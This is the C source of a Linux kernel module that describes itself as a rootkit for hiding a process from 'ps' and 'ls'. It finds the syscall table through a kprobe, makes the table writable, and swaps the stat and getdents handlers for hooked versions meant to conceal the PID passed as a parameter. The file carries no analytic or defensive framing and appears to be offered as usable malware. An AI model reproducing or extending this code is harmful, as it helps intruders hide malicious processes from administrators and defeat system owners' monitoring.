#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <asm/unistd.h>

#include "functions.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tal");
MODULE_DESCRIPTION("A Rootkit for hiding a process from 'ps' && 'ls' commands");
MODULE_VERSION("0.0.1");

module_param(hide_pid, charp, S_IRUGO); 
MODULE_PARM_DESC(hide_pid, "pass the PID");

static int __init entry_rootkit(void){
    buffer_path_pid();

    register_kprobe(&kp);
    syscall_table = kp.addr;
    set_addr_rw((unsigned long) sys_call_table);

    old_stat = (void*) sys_call_table[__NR_stat];
	old_getdents = (void*) sys_call_table[__NR_getdents];

    sys_call_table[__NR_stat] = (unsigned long) new_stat;
	sys_call_table[__NR_getdents] = (unsigned long) new_getdents;

    set_addr_ro((unsigned long) sys_call_table);
    
    return 0;
}

static void __exit exit_rootkit(void){
    set_addr_rw((unsigned long) sys_call_table);
    
    sys_call_table[__NR_stat] = (unsigned long) old_stat;
    
	sys_call_table[__NR_getdents] = (unsigned long) old_getdents;

    set_addr_ro((unsigned long) sys_call_table);
    unregister_kprobe(&kp);
}

module_init(entry_rootkit);
module_exit(exit_rootkit);
